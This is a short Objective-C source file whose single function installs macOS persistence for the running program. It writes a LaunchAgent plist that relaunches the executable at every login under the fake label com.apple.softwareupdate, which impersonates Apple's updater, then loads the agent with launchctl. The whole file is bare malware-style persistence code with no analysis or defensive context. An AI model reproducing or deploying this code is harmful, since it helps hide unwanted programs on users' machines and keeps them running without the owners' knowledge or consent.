#import <Foundation/Foundation.h>

void install_persistence() {
    NSString *path = [[NSBundle mainBundle] executablePath];
    // LaunchAgent plist
    NSString *plist = [NSString stringWithFormat:
        @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        @"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        @"<plist version=\"1.0\"><dict>\n"
        @"<key>Label</key><string>com.apple.softwareupdate</string>\n"
        @"<key>ProgramArguments</key><array><string>%@</string></array>\n"
        @"<key>RunAtLoad</key><true/>\n"
        @"</dict></plist>", path];
    NSString *pathPlist = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/LaunchAgents/com.apple.softwareupdate.plist"];
    [plist writeToFile:pathPlist atomically:YES encoding:NSUTF8StringEncoding error:nil];
    system("launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist");
}